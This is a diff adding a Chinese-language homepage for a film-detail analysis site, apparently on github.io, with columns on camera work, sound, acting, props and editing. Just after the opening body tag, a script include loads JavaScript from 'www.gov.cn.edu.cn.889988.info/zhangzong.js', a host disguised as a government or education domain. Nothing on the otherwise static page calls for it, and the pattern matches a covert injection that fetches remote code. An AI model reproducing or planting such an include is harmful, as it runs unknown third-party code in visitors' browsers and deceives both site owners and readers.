@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>闪闪电影网｜一部电影里那些闪闪发光的细节与幕后</title>
+<meta name="description" content="闪闪电影网专注于影片中的高光细节与幕后工艺，从镜头构图、配乐切入点到演员表演的微表情，帮助观众在第二次观看时发现第一次没注意到的东西。">
+<meta name="keywords" content="闪闪电影网,电影细节解读,镜头语言分析,配乐赏析,幕后花絮,二刷指南">
+<link rel="canonical" href="https://shanshandianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#0c0d12;
+  --bg2:#11131c;
+  --card:#151823;
+  --card2:#1b2030;
+  --gold:#e8b15a;
+  --gold2:#f5d28c;
+  --gold3:#b9822c;
+  --wh:#f3f4f8;
+  --wh2:#c8ccd8;
+  --line:rgba(232,177,90,.28);
+  --line2:rgba(243,244,248,.09);
+  --mute:#8a8fa0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",system-ui,sans-serif;
+  background:var(--bg);color:var(--wh);line-height:1.85;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+  background:
+    radial-gradient(1.2px 1.2px at 12% 18%,rgba(232,177,90,.5) 0,transparent 60%),
+    radial-gradient(1px 1px at 28% 62%,rgba(243,244,248,.3) 0,transparent 60%),
+    radial-gradient(1.4px 1.4px at 64% 24%,rgba(232,177,90,.45) 0,transparent 60%),
+    radial-gradient(1px 1px at 82% 78%,rgba(243,244,248,.28) 0,transparent 60%),
+    radial-gradient(1.2px 1.2px at 44% 88%,rgba(232,177,90,.4) 0,transparent 60%);
+  background-size:100% 100%;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1200px;margin:0 auto;padding:0 40px;position:relative;z-index:2}
+
+/* HEAD */
+.head{padding:26px 0 22px;border-bottom:1px solid var(--line2);position:relative;z-index:2}
+.hd-in{display:flex;justify-content:space-between;align-items:center;gap:24px;flex-wrap:wrap}
+.logo{display:flex;align-items:baseline;gap:12px}
+.logo b{font-size:26px;font-weight:900;letter-spacing:3px;color:var(--gold2);font-family:Georgia,"Songti SC",serif}
+.logo b i{font-style:normal;color:var(--wh)}
+.logo span{font-size:11px;letter-spacing:3px;color:var(--mute);text-transform:uppercase;border:1px solid var(--line2);padding:4px 10px}
+.hd-meta{font-size:12.5px;color:var(--mute);text-align:right;line-height:1.9;font-family:ui-monospace,monospace}
+.hd-meta a{color:var(--gold2)}
+.hd-meta a:hover{color:var(--gold)}
+
+/* HERO */
+.hero{padding:70px 0 60px;position:relative;z-index:2}
+.hero-grid{display:grid;grid-template-columns:1.35fr 1fr;gap:64px;align-items:center}
+.eyebrow{font-size:11.5px;letter-spacing:5px;color:var(--gold);text-transform:uppercase;margin-bottom:22px;display:flex;align-items:center;gap:12px}
+.eyebrow::before{content:"";width:38px;height:1px;background:var(--gold);display:block}
+h1{font-size:60px;font-weight:900;line-height:1.12;letter-spacing:1px;color:var(--wh);font-family:Georgia,"Songti SC",serif}
+h1 em{font-style:normal;color:var(--gold2);display:block;font-size:30px;letter-spacing:4px;margin-top:14px}
+.sub{margin-top:28px;font-size:16.5px;color:var(--wh2);line-height:2.05;max-width:620px}
+.cta{margin-top:40px;display:flex;gap:16px;flex-wrap:wrap;align-items:center}
+.cta a{font-size:13.5px;letter-spacing:1px;padding:14px 28px;border:1px solid var(--gold);color:var(--gold2);transition:.2s}
+.cta a:hover{background:var(--gold);color:var(--bg)}
+.cta a.ghost{border-color:var(--line2);color:var(--wh2)}
+.cta a.ghost:hover{background:transparent;color:var(--gold2);border-color:var(--gold)}
+
+/* SPOTLIGHT */
+.spot{position:relative;border:1px solid var(--line);background:linear-gradient(150deg,var(--card) 0%,var(--card2) 100%);padding:40px 38px;min-height:430px;display:flex;flex-direction:column;justify-content:space-between}
+.spot .tag{font-size:10.5px;letter-spacing:4px;color:var(--gold);font-family:Arial,sans-serif}
+.spot h3{font-size:34px;font-weight:900;line-height:1.3;margin:14px 0 18px;font-family:Georgia,"Songti SC",serif}
+.spot p{font-size:14px;color:var(--wh2);line-height:2}
+.spot .quotes{margin-top:26px;border-top:1px solid var(--line2);padding-top:22px;display:flex;flex-direction:column;gap:14px}
+.spot .quotes div{font-size:13px;color:var(--mute);padding-left:18px;border-left:2px solid var(--gold3);line-height:1.85}
+.spot .quotes div b{color:var(--gold2);font-weight:400;display:block;font-size:11px;letter-spacing:2px;margin-bottom:3px;font-family:Arial,sans-serif}
+.spot .shines{display:flex;gap:10px;margin-top:24px;flex-wrap:wrap}
+.spot .shines i{font-style:normal;font-size:11px;letter-spacing:1px;padding:6px 14px;border:1px solid var(--line);color:var(--gold2)}
+
+/* SECTION */
+section{padding:78px 0;border-top:1px solid var(--line2);position:relative;z-index:2}
+section:first-of-type{border-top:0}
+.st{display:grid;grid-template-columns:260px 1fr;gap:50px;align-items:end;margin-bottom:50px}
+.st .no{font-family:Georgia,serif;font-size:13px;letter-spacing:3px;color:var(--gold)}
+.st .no b{display:block;font-size:52px;line-height:1;margin-top:10px;color:var(--gold2)}
+.st h2{font-size:28px;font-weight:900;line-height:1.5;font-family:Georgia,"Songti SC",serif;border-bottom:1px solid var(--line);padding-bottom:18px}
+.st h2 small{display:block;font-size:13.5px;color:var(--mute);font-weight:400;margin-top:10px;font-family:"PingFang SC",sans-serif;line-height:1.9;letter-spacing:0}
+
+/* NOTICE BOARD */
+.board{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.note{background:var(--card);border:1px solid var(--line2);border-top:2px solid var(--gold3);padding:34px 30px;transition:.25s}
+.note:hover{border-color:var(--gold);background:var(--card2);transform:translateY(-5px)}
+.note .k{font-size:11px;letter-spacing:3px;color:var(--gold);font-family:Arial,sans-serif;margin-bottom:16px}
+.note h3{font-size:21px;font-weight:900;margin-bottom:14px;font-family:Georgia,"Songti SC",serif;line-height:1.45}
+.note p{font-size:14px;color:var(--wh2);line-height:1.95}
+.note .more{margin-top:20px;font-size:12.5px;letter-spacing:1px;color:var(--gold2);display:inline-flex;align-items:center;gap:8px}
+.note .more::after{content:"→";transition:.2s}
+.note:hover .more::after{transform:translateX(6px)}
+
+/* TIMELINE */
+.tl{position:relative;padding-left:34px}
+.tl::before{content:"";position:absolute;left:6px;top:8px;bottom:8px;width:1px;background:linear-gradient(var(--gold),transparent)}
+.tl-item{position:relative;padding:0 0 44px 40px;border-bottom:1px solid var(--line2);margin-bottom:44px}
+.tl-item:last-child{border-bottom:0;margin-bottom:0;padding-bottom:0}
+.tl-item::before{content:"";position:absolute;left:-32px;top:7px;width:13px;height:13px;border-radius:50%;background:var(--bg);border:2px solid var(--gold)}
+.tl-item .tm{font-family:Arial,sans-serif;font-size:12px;letter-spacing:2px;color:var(--gold);margin-bottom:10px}
+.tl-item h3{font-size:22px;font-weight:900;margin-bottom:12px;font-family:Georgia,"Songti SC",serif}
+.tl-item p{font-size:15px;color:var(--wh2);line-height:2}
+.tl-item .spec{margin-top:16px;display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--line2)}
+.tl-item .spec div{padding:14px 16px;border-right:1px solid var(--line2);font-size:12.5px;color:var(--mute)}
+.tl-item .spec div:last-child{border-right:0}
+.tl-item .spec div b{display:block;color:var(--gold2);font-size:12px;font-weight:400;letter-spacing:1px;margin-bottom:5px;font-family:Arial,sans-serif}
+
+/* REEL */
+.reel{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line2)}
+.reel-f{background:var(--card);padding:34px 30px;border-right:1px solid var(--line2);position:relative;min-height:280px;display:flex;flex-direction:column;justify-content:space-between;transition:.2s}
+.reel-f:nth-child(4n){border-right:0}
+.reel-f:hover{background:var(--card2)}
+.reel-f .nm{font-size:11px;letter-spacing:2px;color:var(--gold);font-family:Arial,sans-serif;margin-bottom:16px}
+.reel-f h4{font-size:19px;font-weight:900;line-height:1.5;font-family:Georgia,"Songti SC",serif;margin-bottom:14px}
+.reel-f p{font-size:13px;color:var(--mute);line-height:1.9}
+.reel-f .tagline{font-size:12px;color:var(--wh2);border-top:1px solid var(--line2);padding-top:14px;margin-top:18px;font-family:ui-monospace,monospace}
+
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--gold3);background:var(--card2)}
+.stats div{padding:38px 30px;border-right:1px solid var(--line);text-align:center}
+.stats div:last-child{border-right:0}
+.stats b{display:block;font-size:44px;font-weight:900;color:var(--gold2);font-family:Georgia,serif;line-height:1}
+.stats span{display:block;font-size:13px;color:var(--wh2);margin-top:14px;letter-spacing:1px}
+
+/* ASK */
+.ask{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line2)}
+.ask details{border-bottom:1px solid var(--line2);padding:0}
+.ask details:nth-child(odd){border-right:1px solid var(--line2)}
+.ask details:nth-last-child(-n+2){border-bottom:0}
+.ask summary{cursor:pointer;padding:24px 28px;font-size:15.5px;font-weight:700;list-style:none;display:flex;gap:16px;align-items:baseline;color:var(--wh);transition:.15s}
+.ask summary::-webkit-details-marker{display:none}
+.ask summary::before{content:"?";font-family:Georgia,serif;color:var(--gold);font-size:18px;font-weight:900;flex-shrink:0}
+.ask summary:hover{color:var(--gold2);background:var(--card)}
+.ask details[open] summary{color:var(--gold2)}
+.ask details p{padding:0 28px 26px 56px;font-size:14px;color:var(--wh2);line-height:2}
+
+/* COLOPHON */
+.colo{border:1px solid var(--line);background:var(--card);padding:44px 48px}
+.colo-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:28px}
+.colo-grid div b{display:block;font-size:12px;letter-spacing:2px;color:var(--gold);font-family:Arial,sans-serif;margin-bottom:9px}
+.colo-grid div span{display:block;font-size:14px;color:var(--wh2);line-height:1.95}
+.colo-grid div span u{text-decoration:none;color:var(--gold2);font-family:ui-monospace,monospace;font-size:13px}
+
+/* FOOT */
+footer{position:relative;z-index:2;border-top:1px solid var(--gold);background:var(--bg2);padding:56px 0 30px;margin-top:0}
+.ft{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:48px}
+.ft .lg{font-size:22px;font-weight:900;letter-spacing:3px;color:var(--gold2);font-family:Georgia,"Songti SC",serif}
+.ft .lg+p{font-size:13.5px;color:var(--mute);margin-top:16px;max-width:360px;line-height:2}
+.ft h5{font-size:11px;letter-spacing:3px;color:var(--gold);margin-bottom:20px;font-family:Arial,sans-serif}
+.ft ul{display:flex;flex-direction:column;gap:12px;font-size:13.5px}
+.ft a{color:var(--wh2)}
+.ft a:hover{color:var(--gold2)}
+.fbot{margin-top:48px;padding-top:26px;border-top:1px solid var(--line2);display:flex;justify-content:space-between;flex-wrap:wrap;gap:18px;font-size:12.5px;color:var(--mute);line-height:2}
+.fbot u{text-decoration:none;color:var(--gold2);font-family:ui-monospace,monospace}
+
+/* RESPONSIVE */
+@media (max-width:1020px){
+  .hero-grid,.st{grid-template-columns:1fr;gap:40px}
+  .st{align-items:start}
+  .board,.stats,.colo-grid{grid-template-columns:repeat(2,1fr)}
+  .stats div:nth-child(2){border-right:0}
+  .stats div:nth-child(1),.stats div:nth-child(2){border-bottom:1px solid var(--gold3)}
+  .reel{grid-template-columns:repeat(2,1fr)}
+  .reel-f:nth-child(4n){border-right:1px solid var(--line2)}
+  .reel-f:nth-child(2n){border-right:0}
+  .ft{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 20px}
+  .head{padding:20px 0}
+  .hd-meta{text-align:left}
+  .hero{padding:46px 0 40px}
+  h1{font-size:34px}
+  h1 em{font-size:20px}
+  .sub{font-size:15px}
+  .cta a{padding:12px 20px;flex:1;text-align:center}
+  .spot{padding:30px 24px;min-height:auto}
+  .spot h3{font-size:26px}
+  section{padding:52px 0}
+  .st .no b{font-size:38px}
+  .st h2{font-size:22px}
+  .board,.reel,.stats,.colo-grid{grid-template-columns:1fr}
+  .stats div{border-right:0;border-bottom:1px solid var(--gold3)}
+  .stats div:last-child{border-bottom:0}
+  .reel-f{border-right:0 !important}
+  .tl-item .spec{grid-template-columns:1fr}
+  .tl-item .spec div{border-right:0;border-bottom:1px solid var(--line2)}
+  .tl-item .spec div:last-child{border-bottom:0}
+  .ask{grid-template-columns:1fr}
+  .ask details:nth-child(odd){border-right:0}
+  .ask details:nth-last-child(-n+2){border-bottom:1px solid var(--line2)}
+  .ask details:last-child{border-bottom:0}
+  .colo{padding:32px 24px}
+  .ft{grid-template-columns:1fr}
+  .ft .lg{font-size:19px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="head">
+  <div class="wrap hd-in">
+    <div class="logo">
+      <b><i>★</i> 闪闪电影网 <i>★</i></b>
+      <span>Cinema in Detail</span>
+    </div>
+    <div class="hd-meta">
+      细节解读 · 幕后工艺 · 配乐赏析<br>
+      网站网址 <a href="https://shanshandianyingwang-zh.github.io">https://shanshandianyingwang-zh.github.io</a>
+    </div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <div class="eyebrow">The Bright Bits</div>
+      <h1>闪闪电影网<em>找一部电影里，最亮的那一下</em></h1>
+      <p class="sub">好电影值得看第二遍。第一遍跟着剧情走，第二遍才有余力留意那些被藏起来的东西——一个镜头的起幅、一段配乐的退场、演员在台词之外多给的那零点几秒。本站把这些"闪闪发光"的瞬间单独提出来，逐条说清楚它为什么成立。</p>
+      <div class="cta">
+        <a href="#reel">查看本期聚焦</a>
+        <a href="#ask" class="ghost">常见疑问</a>
+      </div>
+    </div>
+    <aside class="spot">
+      <div>
+        <div class="tag">本期聚焦 / FEATURED</div>
+        <h3>从第一帧到片尾字幕<br>一次完整的重看路径</h3>
+        <p>一部影片在两次观看之间的体验差异，往往来自注意力的分配。第一次认人、认关系、认走向；第二次才能看见剪辑的呼吸、声音的空间，以及那些看似随意、实则排练过很多遍的调度。</p>
+      </div>
+      <div>
+        <div class="quotes">
+          <div><b>镜头 LENS</b>同一个场景的正反打，机位差了不到三十公分，人物的亲疏关系就变了</div>
+          <div><b>声音 SOUND</b>配乐退场的那一秒，比它出现的时候更有分量</div>
+          <div><b>表演 ACTING</b>台词说完了没有立刻切，是多给观众的一点信任</div>
+        </div>
+        <div class="shines"><i>构图</i><i>节奏</i><i>留白</i><i>道具</i></div>
+      </div>
+    </aside>
+  </div>
+</div>
+
+<!-- NOTICE -->
+<section id="notice">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">01<b>栏目</b></div>
+      <h2>内容栏目<small>六个固定栏目，各自负责一类"容易被第一次观看忽略"的东西。不是影评，也不是剧情复述。</small></h2>
+    </div>
+    <div class="board">
+      <article class="note">
+        <div class="k">COLUMN 01</div>
+        <h3>镜头里的心思</h3>
+        <p>逐镜拆解关键场景的构图、景别与运动方式，说清为什么这一下要这么拍，换一个机位会损失什么。</p>
+        <span class="more">查看栏目</span>
+      </article>
+      <article class="note">
+        <div class="k">COLUMN 02</div>
+        <h3>声音的层次</h3>
+        <p>从环境声、对白处理到配乐的进出点，还原声音设计师在观众没察觉处做的取舍。</p>
+        <span class="more">查看栏目</span>
+      </article>
+      <article class="note">
+        <div class="k">COLUMN 03</div>
+        <h3>演员的微表情</h3>
+        <p>不分析演技好坏，只记录台词之外那一两帧里发生了什么，以及它是不是排练出来的。</p>
+        <span class="more">查看栏目</span>
+      </article>
+      <article class="note">
+        <div class="k">COLUMN 04</div>
+        <h3>道具与美术</h3>
+        <p>一个杯子、一张照片、一件反复出现的衣服，往往比旁白更早把结局说出来。</p>
+        <span class="more">查看栏目</span>
+      </article>
+      <article class="note">
+        <div class="k">COLUMN 05</div>
+        <h3>剪辑的呼吸</h3>
+        <p>关注镜头与镜头之间的空隙——跳切、静帧、延迟切换，这些是节奏的真正落点。</p>
+        <span class="more">查看栏目</span>
+      </article>
+      <article class="note">
+        <div class="k">COLUMN 06</div>
+        <h3>二刷建议</h3>
+        <p>给出第二次观看时可以重点留意的位置，以及哪些地方第一遍就该慢下来看。</p>
+        <span class="more">查看栏目</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- TIMELINE -->
+<section id="reel">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">02<b>解析</b></div>
+      <h2>近期解析<small>按时间倒序排列。每一条都标注了对应的时间码范围，方便对照重看。</small></h2>
+    </div>
+    <div class="tl">
+      <div class="tl-item">
+        <div class="tm">10月 02 日 · 场景调度</div>
+        <h3>一场对话里的机位差</h3>
+        <p>两个角色的关系变化，并没有靠台词交代，而是靠三次正反打之间不到三十公分的机位位移。第一次是平视对等，第二次略微俯拍一方，第三次回到平视——整个变化发生在四十秒内，观众通常不会意识到自己被"移动"了。</p>
+        <div class="spec"><div><b>关注点</b>机位与人物权力关系</div><div><b>参考时间码</b>第 38 分钟起</div><div><b>重看建议</b>遮住字幕只看画面</div></div>
+      </div>
+      <div class="tl-item">
+        <div class="tm">09月 26 日 · 声音设计</div>
+        <h3>配乐退场的那一秒</h3>
+        <p>一段旋律在情绪最高处突然抽走，留下的不是安静，而是角色自己的呼吸声。这种"主动撤退"在国产片中相对少见，多数时候会选择在最高点再叠一层弦乐。退一步反而让下一句台词的分量翻倍。</p>
+        <div class="spec"><div><b>关注点</b>配乐进出点</div><div><b>参考时间码</b>第 1 小时 04 分</div><div><b>重看建议</b>关掉画面只听声音</div></div>
+      </div>
+      <div class="tl-item">
+        <div class="tm">09月 18 日 · 表演细节</div>
+        <h3>台词说完之后</h3>
+        <p>不少演员在说完台词后会有一个"不立刻交出去"的停顿，时间极短，但足以让这句话像是从自己身上掉下来的，而不是从剧本上念出来的。这类细节无法通过配音还原，也是原声版本的价值所在。</p>
+        <div class="spec"><div><b>关注点</b>台词后的留白</div><div><b>参考时间码</b>第 52 分钟附近</div><div><b>重看建议</b>重点看手部与眼神</div></div>
+      </div>
+      <div class="tl-item">
+        <div class="tm">09月 09 日 · 道具线索</div>
+        <h3>反复出现的一件东西</h3>
+        <p>某个道具在片中出现了四次，前三次观众几乎不会留意，第四次出现时它已经承担了全部的情感解释。道具的重复出现不是巧合，通常是美术部门最早确定的方案之一。</p>
+        <div class="spec"><div><b>关注点</b>道具的重复出现</div><div><b>参考时间码</b>第 12 / 41 / 68 / 89 分</div><div><b>重看建议</b>记录每次出现时的状态</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- REEL FOUR -->
+<section id="craft">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">03<b>幕后</b></div>
+      <h2>幕后分工<small>一部电影的高光瞬间，多数不是临场灵光，而是四个部门反复磨合后的结果。</small></h2>
+    </div>
+    <div class="reel">
+      <div class="reel-f">
+        <div class="nm">DEPT 01</div>
+        <h4>摄影</h4>
+        <p>负责把导演的空间构想变成具体的画面。机位、焦段、灯光角度，每一项都在影响观众对人物的判断。</p>
+        <div class="tagline">关键词 · 景别 / 运镜 / 布光</div>
+      </div>
+      <div class="reel-f">
+        <div class="nm">DEPT 02</div>
+        <h4>声音</h4>
+        <p>常被低估的部门。环境声的层次、对白的清晰度、配乐的进出时机，决定了一场戏是否"立得住"。</p>
+        <div class="tagline">关键词 · 环境声 / 混音 / 静默</div>
+      </div>
+      <div class="reel-f">
+        <div class="nm">DEPT 03</div>
+        <h4>表演</h4>
+        <p>演员在台词之外给出的信息，往往是全片最容易被低估的部分，也最难通过文字转述。</p>
+        <div class="tagline">关键词 · 微表情 / 停顿 / 肢体</div>
+      </div>
+      <div class="reel-f">
+        <div class="nm">DEPT 04</div>
+        <h4>剪辑</h4>
+        <p>最后一道"编剧"。两个镜头之间的切换位置，会直接改变一场戏的情绪走向与信息量。</p>
+        <div class="tagline">关键词 · 跳切 / 节奏 / 静帧</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<section id="numbers">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">04<b>数据</b></div>
+      <h2>本站构成<small>内容结构的透明说明。数据仅作参考，具体条目以站内实际更新为准。</small></h2>
+    </div>
+    <div class="stats">
+      <div><b>128</b><span>已发布细节条目</span></div>
+      <div><b>46</b><span>部影片解析</span></div>
+      <div><b>6</b><span>固定内容栏目</span></div>
+      <div><b>4</b><span>幕后分工方向</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="ask">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">05<b>答疑</b></div>
+      <h2>常见疑问<small>关于内容立场、引用方式与更新频率的说明。</small></h2>
+    </div>
+    <div class="ask">
+      <details open>
+        <summary>这里的内容算影评吗？</summary>
+        <p>不算。本站不做好坏判断，也不参与评分与排名。所有条目只描述"这里发生了什么"以及"它可能是怎么做出来的"，结论由读者自己下。</p>
+      </details>
+      <details>
+        <summary>为什么总是建议二刷？</summary>
+        <p>第一遍观看时，观众的大部分注意力被剧情占用，留给画面与声音的余量很少。第二遍的注意力才是自由的，这也是多数细节只有在重看时才会被注意到的原因。</p>
+      </details>
+      <details>
+        <summary>时间码标注准确吗？</summary>
+        <p>时间码可能因版本、介质与地区版本存在几秒差异。本站标注的是参考范围，用于定位而非精确对齐，请以手中版本的实际画面为准。</p>
+      </details>
+      <details>
+        <summary>涉及剧透怎么办？</summary>
+        <p>本站内容默认讨论完整剧情，多数条目建立在"已经看过"的前提下。首次观看者如需保留惊喜，建议先看完原片再回来对照。</p>
+      </details>
+      <details>
+        <summary>内容多久更新一次？</summary>
+        <p>按周更新，通常围绕同一部影片连续出 3 到 4 条不同角度的条目，便于对照阅读，而不是每天零散更新一条。</p>
+      </details>
+      <details>
+        <summary>可以转载其中的分析吗？</summary>
+        <p>个人分享欢迎注明出处，商业用途请先联系。引用时建议保留完整段落，避免只摘取结论而忽略前提。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- COLOPHON -->
+<section id="about">
+  <div class="wrap">
+    <div class="st">
+      <div class="no">06<b>资料</b></div>
+      <h2>站点资料<small>关于闪闪电影网的基本信息，便于读者与合作伙伴确认。</small></h2>
+    </div>
+    <div class="colo">
+      <div class="colo-grid">
+        <div><b>SITE NAME</b><span>闪闪电影网</span></div>
+        <div><b>WEB ADDRESS</b><span><u>https://shanshandianyingwang-zh.github.io</u></span></div>
+        <div><b>CONTENT</b><span>影片细节解读与幕后工艺</span></div>
+        <div><b>COLUMNS</b><span>镜头 / 声音 / 表演 / 道具 / 剪辑 / 二刷</span></div>
+        <div><b>POSITION</b><span>不做评分，不做排名</span></div>
+        <div><b>FORMAT</b><span>逐条解析 + 时间码参考</span></div>
+        <div><b>FREQUENCY</b><span>按周更新，单部影片多视角</span></div>
+        <div><b>NOTE</b><span>本站仅提供分析性内容，不涉及在线播放与资源下载</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <div class="lg">★ 闪闪电影网 ★</div>
+        <p>找一部电影里最亮的那一下。第二遍看，才有余力看见细节。</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#notice">内容栏目</a></li>
+          <li><a href="#reel">近期解析</a></li>
+          <li><a href="#craft">幕后分工</a></li>
+          <li><a href="#numbers">本站构成</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>解析方向</h5>
+        <ul>
+          <li><a href="#">镜头与构图</a></li>
+          <li><a href="#">声音与配乐</a></li>
+          <li><a href="#">表演与留白</a></li>
+          <li><a href="#">剪辑与节奏</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于</h5>
+        <ul>
+          <li><a href="#about">站点资料</a></li>
+          <li><a href="#ask">常见疑问</a></li>
+          <li><a href="#">投稿与线索</a></li>
+          <li><a href="#">合作与转载</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>© 2026 闪闪电影网 · 网站网址 <u>https://shanshandianyingwang-zh.github.io</u> · 本站为影片细节解读类内容站点，所有分析均为作者观点，不涉及在线播放与资源下载。</span>
+      <span>细节解读 · 幕后工艺 · 配乐赏析 · 二刷指南</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var items=document.querySelectorAll('.tl-item');
+  if(!('IntersectionObserver' in window)){return;}
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){
+        e.target.style.transition='opacity .6s ease, transform .6s ease';
+        e.target.style.opacity='1';
+        e.target.style.transform='translateY(0)';
+        io.unobserve(e.target);
+      }
+    });
+  },{threshold:.12});
+  items.forEach(function(el){
+    el.style.opacity='0';
+    el.style.transform='translateY(22px)';
+    io.observe(el);
+  });
+})();
+</script>
+</body>
+</html>
